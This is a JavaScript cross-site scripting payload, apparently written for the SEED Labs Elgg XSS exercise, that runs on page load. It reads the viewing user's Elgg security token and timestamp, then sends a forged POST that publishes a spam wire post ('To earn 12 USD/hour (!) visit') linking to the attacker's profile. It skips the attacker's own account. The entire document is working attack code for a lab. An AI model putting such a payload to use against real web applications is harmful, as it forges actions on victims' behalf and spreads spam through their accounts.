<script type="text/javascript">
	window.onload = function(){
		//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		//and Security Token __elgg_token
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	        var token="&__elgg_token="+elgg.security.token.__elgg_token;

		// Have to set each field which will be sent in the post request
		// found the params in the params field of the inspector
		// tried to set the value the same way as shown above
		var text = encodeURIComponent("To earn 12 USD/hour (!) visit ");
		var body = "&body=" + text + "http://www.xsslabelgg.com/profile/samy"
		
		var sendurl="http://www.xsslabelgg.com/action/thewire/add"; //FILL IN
		 
		 

		//Construct the content of your url.
		// concatenate all the key value pairs as the content of our request 
		// send post request with ajax
		// we'll be sending text to our server with our form data formatted in key-value pairs

		var content= ts + token + body; //FILL IN
	
		if(elgg.session.user.guid !== 47)
		{
			//Create and send Ajax request to modify profile
			var Ajax=null;
			Ajax=new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Host","www.xsslabelgg.com");
			Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
			Ajax.send(content);
		}
		
       
	}
</script>
